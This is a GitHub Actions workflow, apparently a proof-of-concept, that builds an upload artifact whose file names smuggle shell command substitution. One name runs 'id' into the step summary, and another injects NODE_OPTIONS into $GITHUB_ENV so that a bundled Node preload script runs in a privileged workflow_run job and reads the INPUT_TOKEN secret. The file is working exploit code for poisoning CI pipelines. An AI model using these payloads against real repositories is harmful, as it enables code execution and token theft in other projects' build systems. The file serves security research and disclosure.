name: Test

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build artifact with attacker-controlled file names and contents
        run: |
          mkdir -p content
          cd content
          printf 'RCE_PROOF: injected shell payload executed on the privileged workflow_run runner\n' > summary.txt
          printf '' > rce.txt
          cat > p.js <<'JS'
          const fs = require('fs');
          const t = process.env.INPUT_TOKEN || '';
          const s = 'PRELOAD_RAN token_len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?');
          try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s + '\n'); } catch (e) {}
          console.log(s);
          JS
          touch 'a$(id>>$GITHUB_STEP_SUMMARY).txt'
          W='${GITHUB_WORKSPACE:0:1}'
          touch "x\$(printf\${IFS}NODE_OPTIONS=--require=$W""tmp$W""content$W""content$W""p.js\\n>>\$GITHUB_ENV).txt"
          ls -la
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
